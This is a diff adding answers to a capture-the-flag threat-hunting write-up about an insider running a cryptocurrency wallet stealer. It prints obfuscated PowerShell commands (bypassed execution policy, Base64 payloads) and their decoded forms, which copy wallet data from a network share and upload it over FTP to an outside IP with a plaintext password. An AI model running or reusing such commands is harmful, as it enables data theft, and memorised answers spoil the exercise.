@@ -176,12 +176,49 @@ ProcessEvents
 ```
 <br>
 
+The first result that is returned.<br><br>
+
+```
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc Y3J5cHRvX3N0ZWFsZXIuZXhlIC0tZGFpbHkgLS1pbnB1dCBcXFxcTmV0d29ya1NoYXJlXFxjcml0aWNhbF9pbmZyYXN0cnVjdHVyZVxcQ3J5cHRvX1dhbGxldF9TdG9yYWdlX0xvY2F0aW9uc1xcIC0tb3V0cHV0IEM6XFxVc2Vyc1xcamFzbWl0aFxcVG9UaGVNb29uXFw=
+```
+<br>
+
+Decrypt the Base64 string in cyberchef.<br><br>
+
+```
+crypto_stealer.exe --daily --input \\\\NetworkShare\\critical_infrastructure\\Crypto_Wallet_Storage_Locations\\ --output C:\\Users\\jasmith\\ToTheMoon\\
+```
+<br>
+
 **Answer: C:\\Users\\jasmith\\ToTheMoon\\;tothemoon**<br><br>
 
 **Q16. At what tempo does she set the tool to run? (one word)**<br><br>
-**Answer: **<br><br>
+Second result from previous query.<br><br>
+From the previous query, the frequency is stated.<br><br>
+
+**Answer: daily**<br><br>
 
 **Q17. What password does Jane use for the tool?**<br><br>
-**Answer: **<br><br>
+The second result from query in question 15.<br><br>
 
-**Q15. **<br><br>
+```
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAnXFxub29NZWhUb1RcXGh0aW1zYWpcXHNyZXNVXFw6QyBodGFwLS0gMTIxLjMyLjY1LjI4MSBwaS0tIDEyIHRyb3AtLSAibW9jLmxhaWNuYW5pZmFyZWRvdHB5cmNuZSIgbWl0Y2l2LS0gNURONEhydUZGMHRpM2s0dGxsM3dPVFlSQ2hjdW0ydG9nVSBzc2FwLS0gaHRpbXNhaiByZXN1LS0geWxpYWQtLSBleGUudG5laWxjX3B0ZicgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
+```
+<br>
+
+Decrypt the Base64 string in cyberchef.<br><br>
+
+```
+( '\\nooMehToT\\htimsaj\\sresU\\:C htap-- 121.32.65.281 pi-- 12 trop-- "moc.laicnanifaredotpyrcne" mitciv-- 5DN4HruFF0ti3k4tll3wOTYRChcum2togU ssap-- htimsaj resu-- yliad-- exe.tneilc_ptf' -split '' | %{$_[0]}) -join ''
+```
+<br>
+
+Reverse the string.<br><br>
+
+```
+'' nioj- )}]0[_${% | '' tilps- 'ftp_client.exe --daily --user jasmith --pass Ugot2muchCRYTOw3llt4k3it0FFurH4ND5 --victim "encryptoderafinancial.com" --port 21 --ip 182.56.23.121 --path C:\\Users\\jasmith\\ToTheMoon\\' (
+```
+<br>
+
+
+**Answer: Ugot2muchCRYTOw3llt4k3it0FFurH4ND5**<br><br>
